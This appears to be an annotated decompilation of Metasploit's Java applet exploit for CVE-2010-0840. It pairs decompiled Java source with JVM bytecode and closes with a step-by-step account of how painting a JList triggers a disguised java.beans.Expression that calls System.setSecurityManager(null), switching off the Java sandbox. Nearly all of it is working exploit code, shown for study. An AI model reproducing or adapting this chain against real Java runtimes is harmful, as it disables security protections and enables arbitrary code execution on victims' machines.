// todo: jasmin it

// .class from
// http://metasploit.com/svn/framework3/trunk/data/exploits/cve-2010-0840/vuln/Exploit.class

// source from jad-ing it

// comments from
// http://slightlyrandombrokenthoughts.blogspot.com/2010/04/java-trusted-method-chaining-cve-2010.html

// instantiate a vuln.Link (subclass of java.beans.Expression) pointing the invoke params to class: java.lang.System, method setSecurityManager, args: null


       Object obj = java/lang/System;
ldc_w               java.lang.System
astore_1

        String s1 = "setSecurityManager";
ldc                 "setSecurityManager"
astore_2

        Object aobj[] = {
            null
        };
iconst_1
anewarray           java.lang.Object
dup
iconst_0
aconst_null
aastore
astore_3

        Link link = new Link(obj, s1, aobj);
new                 vuln.Link
dup
aload_1
aload_2
aload_3
invokespecial       void vuln.Link.<init>(java.lang.Object, java.lang.String, java.lang.Object[])
astore              local.04

// instantiate a new java.util.HashSet and put the vuln.Link (which is also a Map.Entry) in the Set
        final HashSet s = new HashSet();
new                 java.util.HashSet
dup
        s.add(link);
invokespecial       void java.util.HashSet.<init>()
astore              local.05

// instantiate an anonymous subclass of HashMap where the entrySet method returns the instance defined above
        HashMap hashmap = new HashMap() {

            public Set entrySet()
            {
                return s;
            }

            final HashSet val$s;
            final Exploit this$0;


            {
                this$0 = Exploit.this;
                s = hashset;
                super();
            }
        }
aload               local.05
aload               local.04
invokevirtual       boolean java.util.HashSet.add(java.lang.Object)
pop

new                 vuln.Exploit$1
dup
aload_0
aload               local.05
invokespecial       void vuln.Exploit$1.<init>(vuln.Exploit, java.util.HashSet)
astore              local.06


// instantiate a javax.swing.JList object, passing the HashMap instance defined above as the list contents
        JList jlist = new JList(new Object[] {
            hashmap
        });
new                 javax.swing.JList
dup
iconst_1
anewarray           java.lang.Object
dup
iconst_0
aload               local.06
aastore
invokespecial       void javax.swing.JList.<init>(java.lang.Object[])
astore              local.07
return

// add the JList on any visible component (such as the applet itself)
        add(jlist);
aload_0
aload               local.07
invokevirtual       java.awt.Component vuln.Exploit.add(java.awt.Component)
pop
    }

And here's what happens when the digital Rube Goldberg machine is set into motion:

- the GUI thread wants to draw the JList and calls JList.paint(Graphics)
- JList while drawing itself, calls toString on the list contents, including said anonymous subclass of HashMap
- HashMap inherits AbstractMap's toString method which calls entrySet().iterator() and iterates the resulting Set, calling getValue on each Entry
- one of the Entry objects returned by the implementation is a subclass of Statement, which implements the Entry interface's getValue() method with the Statement.getValue()
- Expression.getValue() calls Statement.invoke()
- Statement.invoke() has been parametrized to call System.setSecurityManager(null) via reflection

...and Java security gets switched off.